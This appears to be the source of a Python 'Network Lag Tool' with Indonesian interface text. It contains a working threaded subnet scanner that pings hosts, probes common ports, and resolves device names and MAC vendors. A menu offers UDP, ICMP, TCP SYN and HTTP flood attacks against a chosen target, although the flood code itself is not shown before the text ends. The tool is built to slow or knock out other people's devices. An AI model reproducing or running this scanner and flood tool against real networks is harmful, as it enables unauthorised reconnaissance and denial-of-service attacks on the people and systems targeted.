# -*- coding: utf-8 -*-
# Network Lag Tool by YOGGS - github.com/artcasds
# Cross-platform: Windows + Linux + Termux
import os, sys, io, re, time, random, socket, struct, threading, subprocess

IS_WINDOWS = os.name == "nt"
IS_TERMUX = "TERMUX_VERSION" in os.environ

if IS_WINDOWS:
    os.system("chcp 65001 >nul 2>&1")
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    print("pip install colorama dulu")
    sys.exit(1)

LINE = Fore.LIGHTBLACK_EX
TXT  = Fore.WHITE
ART  = Fore.GREEN + Style.BRIGHT

stop_flag = False
packet_count = 0
lock = threading.Lock()

# === DEVICE NAME RESOLUTION ===
VENDORS = {}
def _load_vendors():
    global VENDORS
    lines = """Apple Inc.
00:25:00,04:0C:CE,08:66:98,10:1C:7C,10:40:F3,14:7D:DA,18:AF:61,1C:36:BB,1C:E6:2C,20:78:F0,20:AA:25,24:A0:74,28:6A:BA,2C:BE:08,30:10:E4,30:35:AD,34:C0:59,38:C9:86,3C:15:C2,40:30:05,40:4D:7F,40:B3:95,44:00:10,44:D8:83,48:D7:05,50:7A:55,54:26:96,5C:F7:E6,60:03:08,60:9C:FF,64:5A:ED,68:5B:35,6C:4D:73,70:56:81,74:E2:F5,78:31:C1,78:7B:8A,7C:D1:C3,80:CE:62,84:B1:53,88:66:A5,8C:85:90,90:9C:4A,94:E9:79,98:01:A7,9C:20:7B,A4:5E:60,A8:51:5B,B0:34:95,B4:F0:AB,B8:1D:AA,BC:52:B7,C0:B6:58,C4:2C:03,C8:69:CD,CC:46:D6,D0:03:4B,D4:61:9D,D8:BB:C1,DC:A9:04,E0:C9:7A,E4:5F:01,E8:8D:56,EC:FA:BC,F0:18:98,F0:76:1C,F4:5C:89,F8:1E:DF,FC:E9:98
Samsung Electronics
00:12:47,00:16:32,00:23:39,00:24:54,30:96:FB,34:23:BA,38:01:97,40:0E:85,48:44:F7,50:01:BB,50:F5:20,54:40:AD,58:C3:8B,5C:0A:5B,60:6B:BD,64:77:91,68:27:37,70:F9:27,78:25:AD,78:40:E4,78:BD:BC,80:65:6D,84:25:DB,88:32:9B,90:01:17,90:18:7C,94:01:C2,94:35:0A,98:0C:82,A0:07:98,A0:82:1F,A4:07:B6,AC:36:13,B0:47:BF,B0:72:BF,B4:3A:28,B8:57:D8,BC:14:85,C0:97:27,C0:BD:D1,C4:42:02,C8:38:70,CC:07:AB,D0:22:BE,D0:59:E4,D0:87:E2,D4:88:90,D8:57:EF,DC:08:56,E0:99:71,E0:CB:EE,E4:7C:F9,E8:03:9A,E8:50:8B,EC:1F:72,F0:08:F1,F0:5A:09,F0:D7:AA,F4:09:D8,F4:42:8F,F8:04:2E,FC:F1:36
Xiaomi
28:6C:07,64:CC:2E,7C:1C:68,78:11:DC,AC:BC:32,B0:E2:35,0C:1D:AF,18:59:2E,D4:97:0B,34:80:B3,20:A6:80,74:51:BA
Huawei
00:18:7D,00:21:E8,00:25:68,00:34:FE,00:46:4B,00:9A:CD,04:BD:70,04:C0:6F,08:19:A6,08:63:61,0C:37:DC,10:1B:54,10:44:00,10:C6:1F,14:0A:2A,14:57:9F,14:B7:3D,18:C5:8A,1C:68:3E,1C:B1:3F,20:08:ED,20:0B:C7,20:2B:C1,24:09:95,24:69:A5,24:DB:AC,28:31:52,28:6E:D4,2C:AB:00,30:D1:7E,30:E5:EC,34:29:12,38:F8:89,3C:47:11,3C:F8:08,40:4D:8E,40:CB:A8,44:55:B1,44:6D:3F,48:46:FB,48:AD:08,4C:1F:CC,4C:8B:EF,4C:B1:6C,50:01:BB,50:A7:2B,50:D2:F5,54:25:EA,54:A5:1B,58:2A:F7,5C:09:79,5C:33:8E,5C:7D:5E,60:08:10,60:14:6C,60:21:C4,60:38:E0,60:45:BD,60:57:18,64:16:F0,64:3E:8C,64:DB:43,68:A0:F6,68:A2:7E,6C:B7:49,70:19:2F,70:6B:B9,70:72:3C,70:7B:E8,70:A8:E3,70:F9:27,74:60:FA,74:88:2A,74:A0:63,78:1D:BA,78:6A:89,78:F5:FD,7C:11:CB,7C:60:97,7C:B0:C0,80:38:BC,80:71:79,80:FB:06,84:5B:12,84:A8:E4,84:DB:AC,88:28:B3,88:3F:D3,88:53:D4,88:66:39,88:CF:98,88:E0:F3,8C:34:FD,90:17:AC,90:4E:2B,90:67:1C,90:8D:78,90:F1:AA,94:04:9C,94:77:2B,94:DB:C9,94:FE:22,98:E7:F4,9C:28:EF,9C:B2:B2,A0:04:60,A0:57:E3,A0:8C:F8,A0:A4:3C,A0:EC:F9,A4:99:47,A4:DC:BE,A8:0C:63,A8:1E:83,AC:4E:91,AC:61:EA,AC:CF:5C,AC:E2:15,B0:5B:67,B0:BE:76,B4:15:13,B4:30:52,B4:52:A9,B4:F9:49,B8:BC:1B,BC:09:1B,BC:2D:EF,BC:38:D2,BC:60:A7,BC:76:70,BC:C2:53,C0:70:09,C0:78:5C,C0:B4:7D,C4:05:28,C4:07:2F,C8:3D:D4,C8:51:95,C8:D1:5E,CC:53:B5,CC:96:A0,CC:A2:23,CC:CC:81,D0:2D:B3,D0:7A:B5,D4:40:F0,D4:6A:A8,D4:6E:5C,D4:76:EA,D8:49:0B,DC:09:4C,DC:D2:FC,E0:19:1D,E0:1F:3A,E0:24:7F,E0:36:76,E0:97:96,E4:38:8C,E4:5E:37,E4:68:A3,E4:7E:66,E4:C2:D1,E8:08:8B,E8:39:DF,E8:5D:6B,E8:68:19,E8:CD:2D,EC:23:3D,EC:38:8F,EC:CB:30,EC:F4:BB,F0:18:2C,F0:27:2D,F0:43:47,F0:5B:7B,F0:6B:95,F0:72:EA,F0:77:6D,F0:D7:AA,F4:28:60,F4:55:9C,F4:63:1F,F4:8C:50,F4:C7:14,F4:DC:F9,F4:EE:08,F8:01:13,F8:3D:FF,F8:4A:BF,F8:E8:11,FC:30:BA,FC:48:EF,FC:5B:39,FC:A4:7A
TP-Link
00:04:96,00:0E:8F,00:13:10,00:14:BF,00:1D:0F,00:21:27,00:23:CD,00:25:86,00:26:5A,00:27:19,04:A7:41,08:3E:0C,0C:72:5C,0C:80:63,0C:89:03,0C:E9:9A,10:FE:ED,14:4D:6E,14:6B:9C,14:75:05,14:CC:20,14:CF:92,18:A6:F7,18:E8:29,1C:3B:F3,1C:5F:2B,1C:87:2C,1C:B7:2C,20:55:31,20:6B:E7,20:DC:E6,20:EE:28,24:05:0F,24:A4:3C,24:D9:21,28:87:2E,28:B2:BD,2C:E4:12,2C:E8:71,30:45:96,30:46:9A,30:52:5A,30:6E:EC,30:71:B2,30:B5:C2,30:D1:7E,30:DE:4B,34:08:04,34:2C:C4,34:60:F9,34:8F:C1,34:97:F6,34:CD:BE,34:E0:CF,38:21:87,38:2C:4A,38:37:8B,38:4C:4B,38:53:19,38:5C:F6,38:72:C0,38:83:45,38:97:F6,38:B1:DB,38:F3:AB,3C:21:9C,3C:28:6D,3C:46:D8,3C:52:82,3C:68:16,3C:84:6A,3C:8B:FE,3C:91:74,3C:A6:2F,3C:A8:2A,3C:AD:0D,3C:DC:BC,3C:E1:CA,3C:E5:A6,3C:E6:83,3C:F8:62,40:16:7E,40:33:6C,40:3C:FC,40:40:6C,40:4A:03,40:51:3C,40:6C:8F,40:89:A1,40:8B:F5,40:91:51,40:95:BD,40:9B:CD,40:9C:28,40:A6:D8,40:EC:99,44:07:0B,44:19:B6,44:23:AA,44:2C:5E,44:33:4C,44:45:53,44:4B:80,44:4E:1A,44:51:DB,44:56:33,44:5E:CD,44:65:0D,44:68:AB,44:8A:5B,44:97:5A,44:9E:F1,44:B3:82,44:B4:33,44:B8:D2,44:C3:46,44:D1:FA,44:D4:37,44:D6:E1,44:E1:27,44:E9:DD,44:EA:48,44:EE:02,48:07:0D,48:11:F4,48:13:F3,48:2C:A0,48:3C:0C,48:46:14,48:46:FB,48:52:61,48:59:29,48:5D:60,48:6E:5B,48:6F:26,48:7D:A6,48:83:C7,48:86:E8,48:8F:5A,48:93:DC,48:98:CF,48:9B:14,48:9D:24,48:9E:18,48:A3:80,48:A9:8A,48:AD:08,48:B2:5D,48:B8:4C,48:BE:10,48:C1:EE,48:C3:46,48:C7:96,48:D1:2F,48:D2:24,48:D3:43,48:D7:05,48:DA:35,48:DC:9D,48:DF:37,48:E1:E9,48:E2:AD,48:E7:DA,48:EA:63,48:EE:0C,48:F1:7F,48:F4:7D,48:FC:B8,48:FD:A1,48:FE:3C
Asus
00:E0:4C,00:22:15,00:24:8C,00:26:18,00:2C:2C,04:D4:C4,08:62:66,08:9E:08,0C:98:01,10:BF:48,10:C3:AB,14:DA:E9,18:C4:26,20:CF:30,24:4B:FE,2C:4D:54,30:5A:3A,30:85:A9,30:EB:FC,34:97:F6,38:D5:47,3C:18:9F,3C:22:FB,3C:58:C2,3C:8C:40,40:B0:34,40:F4:EC,44:E9:DD,48:EE:0C,4C:ED:FB,50:4F:94,50:55:3A,50:EB:6C,54:04:A6,58:11:22,5C:C0:A0,60:6C:66,64:D1:54,68:1C:A2,6C:4A:85,70:85:43,70:85:C2,74:D0:2B,78:8C:4D,7C:8B:CA,80:2E:03,84:16:F9,88:D7:F6,8C:21:0A,90:E6:52,94:DF:58,98:DA:C4,9C:A2:F4
Sony
00:1E:42,00:26:57,04:5D:4B,10:DF:FC,18:48:CA,20:54:76,28:6F:F1,2C:0B:E4,30:39:26,34:73:2D,3C:5A:B4,40:3B:16,40:B8:37,44:D4:E0,50:46:5D,50:C5:85,54:42:49,54:75:4B,58:17:3C,60:01:94,64:4B:CE,68:37:E2,70:66:55,74:40:BE,78:8A:20,7C:13:1D,80:43:3F,84:38:38,88:24:D7,90:B1:1C,94:DB:56,98:D6:BB,A0:64:C2,A4:5D:5B,A8:C8:3A,AC:0C:14,B0:38:29,B4:51:F9,B8:29:F7,BC:4B:68,C8:6F:B9,CC:3A:35,D0:50:97,D8:96:85,E0:55:3D,E4:7B:3F,E8:3E:FB,EC:8A:47,F0:1D:BC,F4:0E:11,FC:0F:E6
Oppo
00:26:AB,08:2E:5F,10:C3:7B,14:F6:8A,1C:56:8A,20:5D:48,24:0F:8E,28:FF:B2,2C:5B:E1,30:42:A5,38:21:C7,44:82:35,50:2B:73,58:11:22,60:45:BD,60:99:CD,68:9C:70,70:1A:ED,78:25:AD,80:96:CA,84:21:41,8C:F5:A3,90:21:07,94:65:2C,9C:E8:95,A0:20:A6,A4:40:13,A8:06:00,B0:75:0E,B4:45:06,B8:03:CF,BC:64:4B,C0:33:5E,C4:38:D4,C8:2A:14,CC:08:FA,D0:2C:B4,E0:28:B1,E4:46:BD,E8:BE:81,F0:13:C3,F8:8A:45,FC:4D:A1
VMware
00:50:56,00:0C:29,08:00:27,52:54:00,00:15:5D
Raspberry Pi
B8:27:EB,DC:A6:32,D8:3A:DD,2C:CF:67"""
    for block in lines.strip().split("\n\n"):
        name_part = block.split("\n")
        name = name_part[0].strip()
        if len(name_part) > 1:
            for mac in name_part[1].split(","):
                VENDORS[mac.strip().upper()] = name

_load_vendors()

def ping_host(ip):
    try:
        if IS_WINDOWS:
            return os.system(f"ping -n 1 -w 500 {ip} >nul 2>&1") == 0
        else:
            return os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1") == 0
    except:
        return False

def get_mac_from_arp(ip):
    try:
        if IS_WINDOWS:
            out = os.popen(f"arp -a {ip}").read()
        else:
            out = os.popen(f"ip neigh show {ip} 2>/dev/null || arp -n {ip} 2>/dev/null").read()
        for line in out.split("\n"):
            if ip in line:
                m = re.search(r'([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}', line)
                if m:
                    return m.group(0).upper().replace('-', ':')
    except:
        pass
    return None

def get_mac_vendor(mac):
    if not mac:
        return None
    prefix = mac[:8].upper().replace('-', ':')
    return VENDORS.get(prefix)

def get_netbios_name(ip):
    try:
        if IS_WINDOWS:
            out = subprocess.run(["nbtstat", "-A", ip], capture_output=True, text=True, timeout=1)
            for line in out.stdout.split("\n"):
                if "<00>" in line:
                    parts = line.split()
                    if parts and parts[0].strip() not in ("INBOARD", "FFFFFFFF"):
                        name = parts[0].strip()
                        if name != ip:
                            return name
    except:
        pass
    try:
        name = socket.gethostbyaddr(ip)[0]
        if name != ip:
            return name
    except:
        pass
    return None

BRAILLE = f"""{ART}
⠀⠀⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        ⠀⠀⣴⠀⠀
⠀⠀⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      ⠀⠀⠀⠀⣰⣿
⠀⠀⢻⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⠀⢀⣴⣿⡟
⣆⠀⠘⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⣠⣾⣿⣿⠃ ⠀⣰
⢻⣷⡄⠘⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⠃ ⢀⣾⡟
⠈⢿⣿⣶⣌⠻⣿⣿⣿⣿⣷⣦⣄⣀⣘⣿⣶⣶⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⣠⣤⣶⣶⣶⣾⣃⣀⣠⣤⣶⣿⣿⣿⣿⠟⣡⣴⣿⡿⠁
⠀⠀⠈⢿⣿⣿⣷⣮⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠓⠀⠀⠀⠀⠀⢀⣠⣴⣶⣶⣤⣤⠆⠀⠀⠀⠀⠀⠀⠞⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣵⣾⣿⣿⡿⠁⠀
⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⣼⠿⢿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀
⠀⠀⠀⠳⣤⣀⡙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣠⠀⠀⠀⠀⠀⠀⠈⣻⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⣄⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⢋⣀⣤⠞⠀⠀
⠀⠀⠀⠙⢿⣿⣷⣶⣮⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀ ⠀⣠⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⡀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⥥⣶⣾⣿⡿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣾⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠈⠉⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠛⠛⠛⠉⠁⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⣩⽽⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣯⍍⠛⠛⠛⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⠶⣿⣿⡿⠿⠟⢋⣼⣿⠟⢡⡿⠋⠘⣿⣿⣿⣿⣿⣿⠃⠙⢿⡌⠻⣿⣧⡙⠻⠿⢿⣿⣿⠶⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⠉⠀  ⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠉⠙⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡿⣿⣿⣿⣿⣿⣿⢿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡟⣸⣿⣿⣿⣿⣿⣿⣇⢻⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠈⢠⣿⣿⢻⣿⣿⡟⣿⣿⡄⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⢻⣿⣿⢸⣿⣿⡇⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠀⢿⡇⢸⣿⣿⡇⢸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   ⠘⡇⢸⣿⣿⡇⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   ⠀⠁⢸⣿⣿⡇⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀ ⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     ⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠀ ⠀⠀⢿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀ ⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   ⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   
{Style.RESET_ALL}"""

def banner():
    os.system("cls" if IS_WINDOWS else "clear")
    print(BRAILLE)
    print(f"  {ART}NETWORK LAG TOOL{Style.RESET_ALL}")
    print(f"  {LINE}by YOGGS — github.com/artcasds{Style.RESET_ALL}\n")

def info_box():
    print(f"  {TXT}Target IP  : {Fore.YELLOW}belum diisi{Style.RESET_ALL}")
    print(f"  {TXT}Status     : {Fore.GREEN}Siap{Style.RESET_ALL}\n")

def get_local_ip():
    try:
        out = os.popen("ipconfig" if IS_WINDOWS else "ifconfig").read()
        best_ip = None
        current_iface = ""
        for line in out.split("\n"):
            line = line.strip()
            if "adapter" in line.lower() or "Wi-Fi" in line or "wlan" in line.lower() or "eth" in line.lower():
                current_iface = line
            if "IPv4 Address" in line or "inet " in line:
                ip = line.split(":")[-1].strip() if IS_WINDOWS else line.split("inet ")[1].split()[0]
                try:
                    socket.inet_aton(ip)
                    if ip.startswith("192.168.") or ip.startswith("10.") or ip.startswith("172.16."):
                        if any(x in current_iface.lower() for x in ["wi-fi", "wireless", "ethernet", "wlan", "eth"]):
                            return ip
                        if not best_ip:
                            best_ip = ip
                except:
                    pass
        if best_ip:
            return best_ip
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return None

def scan_network():
    local_ip = get_local_ip()
    if not local_ip:
        print(f"  {Fore.RED}[X] Gagal detect IP lokal!{Style.RESET_ALL}")
        return
    subnet = '.'.join(local_ip.split('.')[:3]) + '.'
    print(f"\n  {Fore.GREEN}[*] Local IP : {local_ip}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}[*] Scanning subnet {subnet}0/24 ...{Style.RESET_ALL}\n")
    common_ports = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 135: "MSRPC", 139: "NetBIOS",
        143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
        3306: "MySQL", 3389: "RDP", 5900: "VNC",
        8080: "HTTP-Alt", 8443: "HTTPS-Alt", 8000: "HTTP-Dev",
        5000: "UPnP", 9100: "Printer"
    }
    found = []
    def _scan_host(ip):
        if not ping_host(ip):
            return
        open_ports = []
        for port, name in common_ports.items():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                if s.connect_ex((ip, port)) == 0:
                    open_ports.append((port, name))
                s.close()
            except:
                pass
        found.append((ip, open_ports))
        sys.stdout.write(f"\r  {Fore.GREEN}[+] {ip} ONLINE — {len(open_ports)} port{Style.RESET_ALL}                          ")
        sys.stdout.flush()
    threads = []
    for i in range(1, 255):
        ip = subnet + str(i)
        if ip == local_ip:
            continue
        t = threading.Thread(target=_scan_host, args=(ip,), daemon=True)
        threads.append(t)
        if len(threads) >= 20:
            for t2 in threads: t2.start()
            for t2 in threads: t2.join(timeout=3)
            threads = []
    for t in threads: t.start()
    for t in threads: t.join(timeout=3)
    try:
        arp_out = os.popen("arp -a" if IS_WINDOWS else "ip neigh 2>/dev/null || arp -n 2>/dev/null").read()
        for line in arp_out.split("\n"):
            line = line.strip()
            if subnet in line:
                parts = line.split()
                if parts:
                    ip = parts[0]
                    try:
                        socket.inet_aton(ip)
                    except socket.error:
                        continue
                    last = ip.split('.')[-1]
                    if ip != local_ip and last not in ("255", "0"):
                        found_exists = any(ip == f[0] for f in found)
                        if not found_exists:
                            found.append((ip, []))
    except:
        pass
    seen = set()
    unique = []
    for ip, ports in found:
        if ip not in seen:
            seen.add(ip)
            unique.append((ip, ports))
    all_hosts = sorted(unique, key=lambda x: int(x[0].split('.')[-1]))
    print(f"\n\n  {ART}SCAN RESULT{Style.RESET_ALL}")
    print(f"  {TXT}Subnet  : {Fore.GREEN}{subnet}0/24{Style.RESET_ALL}")
    print(f"  {TXT}Local   : {Fore.GREEN}{local_ip}{Style.RESET_ALL}{Fore.YELLOW} (ini IP lo){Style.RESET_ALL}\n")
    if all_hosts:
        for ip, ports in all_hosts:
            mac = get_mac_from_arp(ip)
            vendor = get_mac_vendor(mac)
            name = get_netbios_name(ip)
            label_parts = []
            if ip.endswith(".1"):
                label_parts.append(f"{Fore.YELLOW}[ROUTER]{Style.RESET_ALL}")
            if name:
                label_parts.append(f"{Fore.CYAN}{name}{Style.RESET_ALL}")
            if vendor:
                label_parts.append(f"{Fore.MAGENTA}{vendor}{Style.RESET_ALL}")
            if mac:
                label_parts.append(f"{LINE}{mac}{Style.RESET_ALL}")
            label = " ".join(label_parts)
            if label:
                print(f"  {Fore.GREEN}{ip}{Style.RESET_ALL}  {label}")
            else:
                print(f"  {Fore.GREEN}{ip}{Style.RESET_ALL}")
            if ports:
                for port, pname in ports:
                    print(f"    {TXT}{Fore.GREEN}{port}{TXT}/tcp  {LINE}{pname}{Style.RESET_ALL}")
            else:
                print(f"    {LINE}no port open{Style.RESET_ALL}")
        print(f"\n  {TXT}Total   : {Fore.GREEN}{len(all_hosts)}{TXT} host aktif{Style.RESET_ALL}")
    else:
        print(f"  {TXT}Host    : {Fore.RED}tidak ada host aktif{Style.RESET_ALL}")
    print()

def menu():
    print(f"  {TXT}MENU{Style.RESET_ALL}\n")
    print(f"  {ART}[01]{TXT} Scan IP             {LINE}scan port target + device info{Style.RESET_ALL}")
    print(f"  {ART}[02]{TXT} UDP Flood           {LINE}kirim packet UDP acak ke target{Style.RESET_ALL}")
    print(f"  {ART}[03]{TXT} ICMP Flood          {LINE}ping flood pake raw socket{Style.RESET_ALL}")
    print(f"  {ART}[04]{TXT} TCP SYN Flood       {LINE}buka koneksi TCP palsu bertubi{Style.RESET_ALL}")
    print(f"  {ART}[05]{TXT} HTTP Flood          {LINE}spam request HTTP ke server{Style.RESET_ALL}")
